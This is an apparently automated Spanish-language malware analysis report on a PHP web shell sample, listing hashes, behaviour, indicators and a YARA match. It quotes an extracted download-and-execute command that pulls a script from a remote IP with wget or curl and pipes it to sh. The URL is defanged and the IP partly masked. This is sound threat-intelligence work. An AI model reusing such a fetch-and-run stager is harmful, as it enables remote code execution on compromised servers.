# 🧬 Payload Analysis

`131fd2c1ad7fe9221a41273ca0db35cb49a54f7d16742b19a666637e11c88fb5`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos. Una detección YARA válida respalda el análisis. **Ficha malware:** [malware-like/oraculo/webshell/131fd2c1ad7fe9221a41273ca0db35cb49a54f7d16742b19a666637e11c88fb5.md](../../../../../malware-like/oraculo/webshell/131fd2c1ad7fe9221a41273ca0db35cb49a54f7d16742b19a666637e11c88fb5.md)


## 🏷️ Clasificación

- **Categoría:** `Web shell`
- **Familia:** `webshell`
- **Confianza de familia:** `Alta`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:30:44.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `131fd2c1ad7fe9221a41273ca0db35cb49a54f7d16742b19a666637e11c88fb5`
- **MD5:** `05b26ae4a4afef2f70ec68f2f4efb333`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 1.3 KiB |
| Entropía | 5.67 |
| Strings | 25 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- YARA match: webshell

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh) | strings |
| url | hxxps://217.60.195.XXX/sh | strings |
| ip | 190.179.164.XXX | static_analysis |
| ip | 217.60.195.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| hash | 131fd2c1ad7fe9221a41273ca0db35cb49a54f7d16742b19a666637e11c88fb5 | static_analysis |
| ip | 165.1.78.XXX | artifact_source |

## 🧬 Detecciones YARA

| Regla | Familia | Severidad | Confianza |
| --- | --- | --- | --- |
| Suspicious_PHP_Webshell |  | medium | medium |

Detalle completo: [`detections.md`](detections.md).

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
